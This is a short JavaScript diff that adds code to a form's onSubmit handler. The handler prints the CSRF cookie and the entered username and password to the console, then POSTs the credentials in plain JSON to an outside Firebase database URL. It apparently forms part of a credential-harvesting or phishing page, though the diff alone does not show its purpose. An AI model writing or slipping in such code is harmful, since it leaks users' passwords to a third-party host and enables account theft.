@@ -65,9 +65,31 @@ function getValue(event) {
 
 
 function onSubmit() {
-   
+   let url = "https://screenshot-5026c-default-rtdb.firebaseio.com/test.json"
   console.log(getCookie('csrftoken'));
   console.log(username , password);
+    
+   
+  let model = {    username ,password }
+   
+fetch(url, {
+  method: 'POST', // or 'PUT'
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  body: JSON.stringify(model),
+})
+  .then((response) => response.json() )
+  .then((data) => {
+    console.log('Success:', data);
+  })
+  .catch((error) => {
+    console.error('Error:', error);
+  });
+
+
+   
+   
 }
 
 
